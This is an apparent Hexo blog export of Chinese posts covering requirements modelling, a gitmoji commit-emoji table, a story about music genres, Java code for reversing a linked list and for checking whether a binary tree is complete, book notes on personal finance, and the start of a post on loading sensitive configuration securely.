<h2 id="功能建模"><a href="#功能建模" class="headerlink" title="功能建模"></a>功能建模</h2><p>功能建模是在结构建模和行为建模的基础上，识别出通过系统实现的部分，一般使用UML用例图表现，描述系统应具有的功能，用于实现用户的日常需要。<br>另外，在用例图的基础上通过原型工具制作出可视化原型也属于功能建模的范畴，通过原型用户能更直观地感知即将开发出来的系统的模样，更好地引出客户需求，同时避免后期需求变更。目前一般采用Axure原型工具制作系统或功能原型。<br>用例图示例如下图所示：<br><img src="http://www.hrealtech.com/public/uploads/ueditor/image/20190824/1566646910375734.jpg" alt="9.jpg"></p>
<h1 id="四、结束语"><a href="#四、结束语" class="headerlink" title="四、结束语"></a>四、结束语</h1><p>可以看出结构化分析方法和面向对象分析方法有相同的地方，那就是都需要先理清业务概念及其关系，虽然SA称为数据建模，而OOA称为结构建模，但本质是相同的。不同的地方在于SA更偏向对数据流的分析，而OOA更偏向对对象行为的分析，而且在现阶段OOA的应用更为广泛，但不得不说的是，无论SA还是OOA都只是需求分析的方法，关键还是在于使用它们的需求分析师。</p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>互联网产品,建模,UML</tag>
      </tags>
  </entry>
  <entry>
    <title>使用gitmoji规范git-commit</title>
    <url>/technology/2017/11/%E4%BD%BF%E7%94%A8gitmoji%E8%A7%84%E8%8C%83git-commit/</url>
    <content><![CDATA[<h1 id="gitmoji"><a href="#gitmoji" class="headerlink" title="gitmoji"></a>gitmoji</h1><blockquote>
<p>一种增强git提交信息表达的图标</p>
<p>官网 <a href="https://gitmoji.carloscuesta.me/">https://gitmoji.carloscuesta.me</a></p>
<p>官方介绍：An emoji guide for your commit messages</p>
</blockquote>
<p>基本语法 <code>:word:</code>   </p>
<p>将语法写入commit任意位置，即可生成对应icon</p>
<table>
<thead>
<tr>
<th>icon</th>
<th>word e.g.</th>
<th>explain</th>
</tr>
</thead>
<tbody><tr>
<td>:recycle:</td>
<td><code>:recycle:</code></td>
<td>Refactoring code.</td>
</tr>
<tr>
<td>✨</td>
<td><code>:sparkles:</code></td>
<td>Introducing new features.</td>
</tr>
<tr>
<td>:construction:</td>
<td><code> :construction:</code></td>
<td>Work in progress.</td>
</tr>
<tr>
<td>🐛</td>
<td><code>:bug:</code></td>
<td>Fixing a bug.</td>
</tr>
<tr>
<td>🔨</td>
<td><code>:hammer:</code></td>
<td>Refactoring code.</td>
</tr>
<tr>
<td>⬆️</td>
<td><code>:arrow_up:</code></td>
<td>Upgrading dependencies.</td>
</tr>
<tr>
<td>⬇️</td>
<td><code>:arrow_down:</code></td>
<td>Downgrading dependencies.</td>
</tr>
<tr>
<td>:twisted_rightwards_arrows:</td>
<td><code> :twisted_rightwards_arrows:</code></td>
<td>Merging branches.</td>
</tr>
<tr>
<td>:fire:</td>
<td><code> :fire:</code></td>
<td>Removing code or files.</td>
</tr>
<tr>
<td>:white_check_mark:</td>
<td><code> :white_check_mark:</code></td>
<td>Adding tests.</td>
</tr>
<tr>
<td>⚡</td>
<td><code>:zap:</code></td>
<td>Improving performance.</td>
</tr>
<tr>
<td>:wrench:</td>
<td><code>:wrench:</code></td>
<td>Changing configuration files. …</td>
</tr>
<tr>
<td>:tada:</td>
<td><code>:tade:</code></td>
<td>Initial commit.</td>
</tr>
<tr>
<td>:art:</td>
<td><code> :art:</code></td>
<td>Improving structure &#x2F; format of the code.</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>git-commit</tag>
        <tag>版本控制</tag>
      </tags>
  </entry>
  <entry>
    <title>一个撩妹故事认清流行音乐流派</title>
    <url>/music/2019/04/%E4%B8%80%E4%B8%AA%E6%92%A9%E5%A6%B9%E6%95%85%E4%BA%8B%E8%AE%A4%E6%B8%85%E6%B5%81%E8%A1%8C%E9%9F%B3%E4%B9%90%E6%B5%81%E6%B4%BE/</url>
    <content><![CDATA[<p>路易斯·阿姆斯特朗（Louis Armstrong）。他是提及爵士音乐，人们最先联想到的人，他以新奥尔良爵士乐风格，在迪克西兰爵士乐配曲下，演奏结构简单、富有戏剧性的作品。他是爵士乐坛无人不知、无人不晓的大人物。每一本关于爵士乐的书，都会提及他的名字。他对于爵士乐的重要意义，就好像古典音乐的巴赫，摇滚乐的猫王。<br>现场交响乐版本《爱乐之城》<a href="https://v.qq.com/x/page/v05187jdzk2.html">https://v.qq.com/x/page/v05187jdzk2.html</a><br>《《爱乐之城》斯坦尼康→摇臂一镜到底演示 the someone in the crowd》<a href="https://v.qq.com/x/page/l0376vuvlav.html">https://v.qq.com/x/page/l0376vuvlav.html</a><br>《爱与之城-你不知道的 25 件事》<a href="https://v.qq.com/x/page/a03773bb8o3.html">https://v.qq.com/x/page/a03773bb8o3.html</a></p>
<p>爵士（Jazz）<br>Louis Armstrong《What a wonderful world》 <a href="https://v.qq.com/x/page/m0160bikj70.html">https://v.qq.com/x/page/m0160bikj70.html</a><br>Louis Armstrong《La Vie En Rose》<br>高司令《爱乐之城》酒吧愤弹曲目：<a href="https://v.qq.com/x/page/x0760o4qsh3.html">https://v.qq.com/x/page/x0760o4qsh3.html</a><br>高司令《爱乐之城》最后一曲：<a href="https://v.qq.com/x/page/i0394wlm16j.html">https://v.qq.com/x/page/i0394wlm16j.html</a><br>一百年（上个世纪 20 年代），在新奥尔良的小酒馆里，有一个非常擅长撩妹的人，他吹一吹小号美女的脸就红了，他能读懂每一个人的心事，他的名字叫作爵士（Jazz）。</p>
<p>放克（Funk）<br>Funk 《<a href="https://v.qq.com/x/page/r0839ow23j4.html%E3%80%8B">https://v.qq.com/x/page/r0839ow23j4.html》</a><br>Jazz 很快结婚了，婚后生了个儿子。儿子从小很崇拜他爸，也想成为撩妹高手，但他长大后爱上了蹦迪，他摸索出了自己的撩妹心得，于是他就跟他爸说，你的泡妞方式早就过时了，现在年轻妹子都喜欢有节奏的人，听起来就像这样（咚、嗒、咚、嗒）他这个儿子就叫放克（Funk）。</p>
<p>嘻哈（Hiphop）<br><a href="https://v.qq.com/x/page/a0341tf4qdo.html">https://v.qq.com/x/page/a0341tf4qdo.html</a><br>Funk 想把兴趣发展成事业，他说不拿着天使轮，今年过年不回家。于是在他开了一家公司叫 嘻哈（Hiphop），有个年轻人叫 DJ Kool Herc，他是真的很酷，被誉为 Hiphop 之父，他是第一个把两台唱机玩起来的 DJ，可以说没有他就没有 Hiphop，他的音乐就是舞者们的兴奋剂。</p>
<p>新式嘻哈（New School Hiphop）<br><a href="https://v.qq.com/x/page/n1426a3p2r6.html">https://v.qq.com/x/page/n1426a3p2r6.html</a><br>随着 Hiphop 的事业发展如日中天，Hiphop 的员工划分成两个阵营。一类觉得以前的泡妞方法早过时了，现在没个房没个车啊，只能做单身狗啊，于是他们带上金灿灿的假牙，金灿灿的大金链子，金灿灿的金钱，很明显，这部分人是属于外向的。</p>
<p>旧式嘻哈（Old School Hiphop）<br><a href="https://v.qq.com/x/page/t0537qrpcb5.html">https://v.qq.com/x/page/t0537qrpcb5.html</a><br>那还有一部分是内向的人怎么办呢？难道就不能愉快的泡妞了吗？</p>
<p>爵士嘻哈（Jazz Hiphop）<br>《点星 Point The Star》<br>Nujabes - 《混沌武士（Samurai Champloo）》-《battlecry》<br>Nujabes - 《混沌武士（Samurai Champloo）》<a href="https://v.qq.com/x/page/c0817f8p1ks.html">https://v.qq.com/x/page/c0817f8p1ks.html</a><br>Nujabes - 《混沌武士（Samurai Champloo）》-《aruarian dance》<br><a href="https://v.qq.com/x/page/a0187s80vah.html">https://v.qq.com/x/page/a0187s80vah.html</a><br>《不是Jazz，不是HipHop，是Jazz-HipHop》<a href="https://mp.weixin.qq.com/s/jlmg0YHj13sU_1tj-K5ZOQ">https://mp.weixin.qq.com/s/jlmg0YHj13sU_1tj-K5ZOQ</a><br>天无绝人之路啊，一次从美国 Hiphop 总部派来的员工和日本的 Hiphop 分公司员工会面了，他们这一见真是相见恨晚，商讨出许多创新泡妞心得，他们发现人是感性的，在老祖宗 Jazz 那里，感性的东西很多，他究其一生都在用不怎么花哨的乐器做出不同的情绪，用旋律获得姑娘的芳心，于是美日合璧创造出了爵士嘻哈（Jazz Hiphop）。他既有老 Jazz 的钢琴采样，或其他 Jazz 器乐的采样，又有最酷的 Hiphop 鼓点节奏。</p>
<p>低保真嘻哈（Lofi Hiphop）<br>《nagashi》<br><a href="https://v.qq.com/x/page/d06388mk33w.html">https://v.qq.com/x/page/d06388mk33w.html</a><br><a href="https://v.qq.com/x/page/e06387xfl4v.html">https://v.qq.com/x/page/e06387xfl4v.html</a><br>可是好景不长，慢慢的他们发现，就算是内向的人也是需要分类的。有一部分内向的人喜欢宅在家里，刷剧，吃零食，一个人在自己的小世界里玩游戏，看书，一个人久了也会不由自主的丧起来，他们是年轻人但是也很怀旧，为了满足这部分人 Hiphop 总部决定创作出低保真嘻哈（Lofi Hiphop），因为它是由 Jazz Hiphop 衍生的，所以形式上基本都是 Jazz Hiphop ，唯一不同的是，他更像是室内的音乐（因为宅嘛），所以 Lofi Hiphop 听起来一般都很安静，而且比较容易引起人感情上的共鸣，它的鼓点听起来闷闷的，就像小盒子里发出来的声音，最重要的是它会有滋啦啦~滋啦啦的声音夹杂其中，这样听起来才复古嘛，像 80 年代的磁带和碟发出来的一样，旧旧的，这个滋啦啦就是 Lofi，是一种让影音失真的技术，这也是为什么 Lofi Hiphop 叫低保真嘻哈的原因。</p>
<p>休闲嘻哈（Chillhop）<br>Bonus Points 《Shaka Brah》<br><a href="https://v.qq.com/x/page/t0561ox6b9q.html">https://v.qq.com/x/page/t0561ox6b9q.html</a><br>相较于宅的这类内向的人，另外一种内向的人就很不一样了。他们虽然也有宅懒病，但是却喜欢在户外葛优躺。为了满足这部分人 Hiphop 总部创作出了休闲嘻哈（Chillhop）。因为是在户外，所以 Chillhop 听起来很空旷，绝对没有 Lofi Hiphop 那种闷闷的声音，感觉很立体很环绕，而且感觉上跟假日密不可分——沙滩椰子树，坐北朝南，海边大别墅，海岛之声。还有就是 Chillhop 里的吉他都很出彩，超级好听。</p>
<p>的士高（Disco）<br>《快乐崇拜》<a href="https://v.qq.com/x/page/y0322efln5k.html">https://v.qq.com/x/page/y0322efln5k.html</a><br>Funk 除了 Hiphop 之外还有另一个儿子叫的士高（Disco），《快乐崇拜》就是大家非常熟悉的一首 Disco 了。的士高，一听这名字就想跳舞对不对，不然早年酒吧怎么叫迪厅呢。</p>
<p>蒸汽波（Vaporwave）<br><a href="https://v.qq.com/x/page/j0515fjl5si.html">https://v.qq.com/x/page/j0515fjl5si.html</a><br>而同期中国都在流行什么音乐呢？《卡拉 OK 金曲一百首》。这些歌也是蒸汽波（Vaporwave）经常采样的， Vaporwave 是一种艺术风格，在视觉设计上和 Vaporwave 相关的封面看起来都挺土酷复古的，一张图里有全世界最让人眼瞎的颜色，赛博朋克的影视作品中常常可以见到蒸汽波的影子，作为这种风格在音乐领域的体现，蒸汽波音乐既不是采样 Hiphop 也不采样 Jazz，它一般采样的是 Jazz 已经流行过去，Hiphop 还像个小婴儿那个时期的流行音乐，像 Funk（咚、嗒、咚、嗒的强烈骤停节奏很适合 Popper 跳舞），或是采样爸爸妈妈辈儿年轻时候听的经典老歌，然后使用各种夸张的滤波器，在 DJ 键盘上的那种旋钮，也是《lala land》里小塞皮笑肉不笑拨弄的那种按钮，制造出忽高忽低，或者控制它音高的效果，让它听起来呜呜哇哇的。</p>
<p>画张图吧<br><a href="https://processon.com/diagraming/5ca9cc16e4b0cfb73429fc69">https://processon.com/diagraming/5ca9cc16e4b0cfb73429fc69</a><br>最开始的音乐流派很少，往往是巴赫、贝多芬、莫扎特这些音乐家的歌，到后来有布鲁斯（Blues）、灵魂乐（Soul）、爵士（Jazz）、摇滚（Rock）。爵士（Jazz） 衍生出了放克（Funk），放克（Funk）又衍生出了 的士高（Disco）、嘻哈（Hiphop）、蒸汽波（Vaporwave） 等。 Hiphop 代表着嘻哈文化，拥有丰富的艺术形式，像街舞、涂鸦、打碟、饶舌（Rap）等等。Hiphop 的音乐流派也有很多，真是一言难尽，Jazz Hiphop 是其中一支不太一样的分类，它更注重旋律及氛围，也更包容，不像其他 Hiphop 一样吵吵闹闹，它属于一部分安静的人。其中 Lofi 是一种让影音失真的技术，俗称滋拉拉，只要 Lofi 一下，很多歌就会自带 Lofi 前缀了。Chillhop 空旷立体，让人心旷神怡。这些音乐流派发展到今天，真是盘根错节，各自发展，又相互融合。可最令人动容的还是他们的老祖宗爵士 Jazz，最后欣赏一段爵士交响乐《Mia &amp; Sebastian’s Theme》吧。</p>
<p>音乐的分类是无穷无尽的，就连蒸汽波（Vaporwave）都已经衍生出很多风格，比如 Future Funk 等等，但不管这些枝叶繁茂的流派到底衍生出多少，他们最初的形态都是那个站在山谷里，望着大自然，伴着河流，用石头敲出的声响，那是人类的第一首音乐。</p>
]]></content>
      <categories>
        <category>music</category>
      </categories>
      <tags>
        <tag>jazz,soul,hiphop,音乐流派</tag>
      </tags>
  </entry>
  <entry>
    <title>单链表原地反序</title>
    <url>/technology/2017/01/%E5%8D%95%E9%93%BE%E8%A1%A8%E5%8E%9F%E5%9C%B0%E5%8F%8D%E5%BA%8F/</url>
    <content><![CDATA[<blockquote>
<p>「原地」指的是除给出类之外,不借助其他的辅助结构</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 带头指针的单链表原地逆序(逆序函数为reverse)</span></span><br><span class="line"><span class="comment">* Created by Willow on 1/5/17.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">List</span> &#123;</span><br><span class="line">  Node head;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">List</span><span class="params">(Node head)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.head = head;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//节点</span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    Node next;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(<span class="type">int</span> data, Node next)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.data = data;</span><br><span class="line">      <span class="built_in">this</span>.next = next;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//逆序</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> == head || <span class="literal">null</span> == head.next || <span class="literal">null</span> == head.next.next)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">Node</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>, cur = <span class="built_in">this</span>.head.next, nex = cur.next;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">null</span> != nex) &#123;</span><br><span class="line">      <span class="comment">//1. 逆置当前节点指向</span></span><br><span class="line">      cur.next = pre;</span><br><span class="line">      <span class="comment">//2. 前置、当前、后置节点的三个指针向前移动</span></span><br><span class="line">      pre = cur;</span><br><span class="line">      cur = nex;</span><br><span class="line">      nex = nex.next;</span><br><span class="line">    &#125;</span><br><span class="line">    cur.next = pre;<span class="comment">//3. 逆置最后一个节点的指向</span></span><br><span class="line">    <span class="built_in">this</span>.head.next = cur;<span class="comment">//4. 头指针指向最后一个节点</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//遍历</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">traverse</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> == head.next)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">Node</span> <span class="variable">cur</span> <span class="operator">=</span> head.next;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">null</span> != cur) &#123;</span><br><span class="line">      System.out.println(cur.data);</span><br><span class="line">      cur = cur.next;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;traverse end \n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//测试入口</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Node</span> <span class="variable">n7</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(<span class="number">7</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="type">Node</span> <span class="variable">n6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(<span class="number">6</span>, n7);</span><br><span class="line">    <span class="type">Node</span> <span class="variable">n5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(<span class="number">5</span>, n6);</span><br><span class="line">    <span class="type">Node</span> <span class="variable">n4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(<span class="number">4</span>, n5);</span><br><span class="line">    <span class="type">Node</span> <span class="variable">n3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(<span class="number">3</span>, n4);</span><br><span class="line">    <span class="type">Node</span> <span class="variable">n2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(<span class="number">2</span>, n3);</span><br><span class="line">    <span class="type">Node</span> <span class="variable">n1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(<span class="number">1</span>, n2);</span><br><span class="line">    <span class="type">Node</span> <span class="variable">head</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(<span class="number">0</span>, n1);</span><br><span class="line">    <span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">List</span>(head);</span><br><span class="line">    list.traverse();</span><br><span class="line">    list.reverse();</span><br><span class="line">    list.traverse();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title>完全二叉树的判定</title>
    <url>/technology/2017/01/%E5%AE%8C%E5%85%A8%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%88%A4%E5%AE%9A/</url>
    <content><![CDATA[<h1 id="树节点类"><a href="#树节点类" class="headerlink" title="树节点类"></a>树节点类</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">  Object Data;</span><br><span class="line">  Node left,right,parent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="二叉树类"><a href="#二叉树类" class="headerlink" title="二叉树类"></a>二叉树类</h1><blockquote>
<p>其中judge方法为判断是否是完全二叉树</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BinTree</span> &#123;</span><br><span class="line">  Node root;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">judge</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n0</span> <span class="operator">=</span> <span class="number">0</span>, n = <span class="number">0</span>, stage = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.root == <span class="literal">null</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    Queue&lt;Node&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    queue.offer(<span class="built_in">this</span>.root);</span><br><span class="line">    <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">      <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">      n++;</span><br><span class="line">      <span class="comment">//三个必要条件之一</span></span><br><span class="line">      <span class="keyword">if</span> (node.left == <span class="literal">null</span> &amp;&amp; node.right != <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="comment">//三个必要条件之二</span></span><br><span class="line">      <span class="keyword">if</span> (stage == <span class="number">2</span> &amp;&amp; (node.left != <span class="literal">null</span> || node.right != <span class="literal">null</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      stage = (node.left != <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>) ? <span class="number">2</span> : stage;</span><br><span class="line">      <span class="keyword">if</span> (node.left != <span class="literal">null</span>)</span><br><span class="line">        queue.offer(node.left);</span><br><span class="line">      <span class="keyword">if</span> (node.right != <span class="literal">null</span>)</span><br><span class="line">        queue.offer(node.right);</span><br><span class="line">      <span class="keyword">if</span> (node.left == <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>) &#123;</span><br><span class="line">        n0++;</span><br><span class="line">        stage=<span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//三个必要条件之三：完全二叉树满足的公式n0=n/2，其中n0是度为0的节点，n是树总的节点数</span></span><br><span class="line">    <span class="keyword">return</span> (n0 == (<span class="type">int</span>) Math.ceil(n / <span class="number">2.0</span>)) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始学理财</title>
    <url>/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/2017/02/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E7%90%86%E8%B4%A2/</url>
    <content><![CDATA[<p>最近读了张鹤的《从零开始学理财》。张鹤是著名的财经作家和理财专家，撰写过《成功理财的16堂课》《银行投资理财赚钱法》等理财类的畅销书。</p>
<p>书中介绍了理财的基本概念、常见的误区和实用的理财技巧。其中的__水库模型__和__资产4321分配法__让理财新手能够快速上手理财。</p>
<h2 id="一、理财的基本概念"><a href="#一、理财的基本概念" class="headerlink" title="一、理财的基本概念"></a>一、理财的基本概念</h2><p>理财是一个系统的工程，它由__收入__、__消费__、__储蓄__、__投资__、__负债__和__保险__6部分构成</p>
<h2 id="二、水库模型"><a href="#二、水库模型" class="headerlink" title="二、水库模型"></a>二、水库模型</h2><p>书中用一个基本的理财模型：水库，形象的描述了理财6个构成部分之间的关系。</p>
<blockquote>
<p>想象自己有一个水库，你每个月都要朝水库里灌水，这就是__收入__。水库的一侧还有一个大坝，衣食住行都会让水从大坝往外流，是你的__消费__。水库里的存水是你的__储蓄__，水库旁边还有一口井，可以慢慢向你的水库里注水，这就是你的__投资__。如果水库干了，向别人借水，这个是__负债__，还水的时候要多给一些，就是__利息__。为了防止意外发生得稳固大坝，就需要__保险__。</p>
</blockquote>
<h2 id="三、最低目标：财务自由"><a href="#三、最低目标：财务自由" class="headerlink" title="三、最低目标：财务自由"></a>三、最低目标：财务自由</h2><p>合理的分配6个部分的比例，构建牢固的“水库”。最终我们可以达到最低目标：__财务自由__。</p>
<p>所谓财务自由是指： 理财的被动收入高于最低消费的财富自由状态</p>
<p>之所以把财务自由作为最低目标是我个人观点，因为只有财务自由了，才可以不用靠出卖劳动力去获得生活成本，才算是脱离了生存压力，生活才有了选择权，是自由的，而自由的生活是我的最低目标。</p>
<h2 id="四、误区"><a href="#四、误区" class="headerlink" title="四、误区"></a>四、误区</h2><h3 id="1-没钱就不理财"><a href="#1-没钱就不理财" class="headerlink" title="1. 没钱就不理财"></a>1. 没钱就不理财</h3><p>没钱更要先建立理财观念，系统性地提高收入，节约开支，增加储蓄，持续投资，清理负债，设置保险。</p>
<p>可以先投资自己，把钱投入到提升自己的技能和素质提高上。关注投资界信息，交学费积累经验。给自己买一份保险，把防水的闸门修得牢固一些。</p>
<h3 id="2-钱是挣来的，不是攒出来的"><a href="#2-钱是挣来的，不是攒出来的" class="headerlink" title="2. 钱是挣来的，不是攒出来的"></a>2. 钱是挣来的，不是攒出来的</h3><p>攒钱有2个好处，一个是可以给你积累本金，能让你在看准机会的时候能出手。另一部分好处是能避免急功近利的心态。最成功的投资基本上都是长线投资。</p>
<h3 id="3-理财就是整天关注理财产品"><a href="#3-理财就是整天关注理财产品" class="headerlink" title="3. 理财就是整天关注理财产品"></a>3. 理财就是整天关注理财产品</h3><p>时刻关注自己的理财产品会增加时间的<span id="back_1"><a href="#1">[1]</a>沉没成本</span>。好的投资策略往往是盯着一个看好产品，然后长期持有，不要频繁更换。</p>
<p>个人认为时间本身就是最昂贵的资产，如果一项投资(学习、认知除外)需要占用你大量的时间，那便是不划算的。</p>
<h2 id="五、四三二一资产分配法"><a href="#五、四三二一资产分配法" class="headerlink" title="五、四三二一资产分配法"></a>五、四三二一资产分配法</h2><p>书中提到了一种适用于理财新手的资产分配方法：4321资产分配法。它是基于恒定混合性策略，即保持<span id="back_2"><a href="#2">[2]</a>投资组合</span>中各类资产的比例固定。</p>
<h3 id="40-投资"><a href="#40-投资" class="headerlink" title="40% 投资"></a>40% 投资</h3><p>初期可选风险较小的债券、基金定投、黄金等。投资是零和博弈，有人赚就有人亏，风险高的投资一定要用闲钱。</p>
<p>e.g. 国债，蚂蚁聚宝下的基金定投，黄金，混合基金等</p>
<h3 id="30-消费"><a href="#30-消费" class="headerlink" title="30% 消费"></a>30% 消费</h3><p>理财需要很强的自控力和克制消费的冲动。如果想持续地增长自己的财富，一定要控制消费，延迟欲望。给自己确立一个维持现有幸福感的最低消费水平，避免陷入一种无限替换和升级的状态。</p>
<p>30%的范围内可以犒劳一下自己，装点一下生活。</p>
<h3 id="20-储蓄"><a href="#20-储蓄" class="headerlink" title="20% 储蓄"></a>20% 储蓄</h3><p>既是原始资金的积累，也是一份保障。最好的实行办法就是强制（e.g. 定期）。</p>
<h3 id="10-保险"><a href="#10-保险" class="headerlink" title="10% 保险"></a>10% 保险</h3><p>常在河边走，哪有不湿鞋</p>
<p>​关键要养成保险意识。在短期内，一个人发生意外事件的可能性是非常低，但是如果把时间尺度拉长，就会发现，早晚会遭遇一次小概率事件。</p>
<h3 id="再有多余收入或飞来横财，再按以上规则迭代分配"><a href="#再有多余收入或飞来横财，再按以上规则迭代分配" class="headerlink" title="再有多余收入或飞来横财，再按以上规则迭代分配"></a>再有多余收入或飞来横财，再按以上规则迭代分配</h3><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>理财是一个长期、系统的过程，首先你得有一种很强的未来感，把自己、沉没成本以及财产都纳入一个长期的规划和打算。养成理财的习惯，合理分配资产可以帮助我们达到理想的财务状态，实现财务自由，最重要的是能把生活品质带上一条持续向上的斜坡，这是把控自己的生活，实现幸福生活的关键。</p>
<hr>
<p><span id="1"><a href="#back_1">[1]</a><strong>沉没成本</strong> 即已经付出且不可收回的成本，如时间、金钱、精力等</span></p>
<p><span id="2"><a href="#back_2">[2]</a><strong>投资组合</strong> 由投资人或金融机构所持有的股票、<a href="http://baike.baidu.com/view/26411.htm">债券</a>、<a href="http://baike.baidu.com/view/3100968.htm">衍生金融</a>产品等组成的集合。投资组合的目的在于分散风险。</span> </p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>理财</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>如何安全地加载敏感配置信息</title>
    <url>/technology/2017/05/%E5%A6%82%E4%BD%95%E5%AE%89%E5%85%A8%E5%9C%B0%E5%8A%A0%E8%BD%BD%E6%95%8F%E6%84%9F%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<p>本文介绍的是配置信息的__动静态__加载，这里的动静态加载可以类比程序的编译时加载和运行时加载的概念，本文将举例说明静态加载配置的缺点、为了避免这些缺点引入动态加载配置的概念，并给出实际操作的方法。</p>
<h2 id="静态加载配置"><a href="#静态加载配置" class="headerlink" title="静态加载配置"></a>静态加载配置</h2><p>我们常常会将配置文件存放在项目上下文环境中，例如classpath下，或者项目某个目录下，启动时去读这个文件，这样的配置可以称之为静态加载配置。静态加载配置不够集中灵活，因为在项目打包的时候就决定了配置信息内容；最重要的是，这种配置方式不够安全，因为配置信息跟随代码，当我们将代码上传到github等开源的代码版本管理平台，那么一些敏感的配置（e.g. 数据库账号密码等）就暴露了。</p>
<p>拿jdbc的配置信息举例。</p>
<p>下面这行xml配置代码是使用jdbc配置数据库连接时在datasource.xml文件中的配置项。它包含一个location属性，该属性告诉了程序该去哪里加载配置信息，值中包含classpath说明这个配置存在于项目上下文中。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- datasource.xml --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--可以将数据库连接池的配置文件单独放在另一个properties中--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath:conf/db.properties&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>以下是上面location指明的db.properties文件中的内容，存储了数据库连接地址、用户名、密码，注意到这些都是敏感配置，很明显存在前面提到的静态加载配置的弊端:不安全，敏感信息暴露无遗。</p>
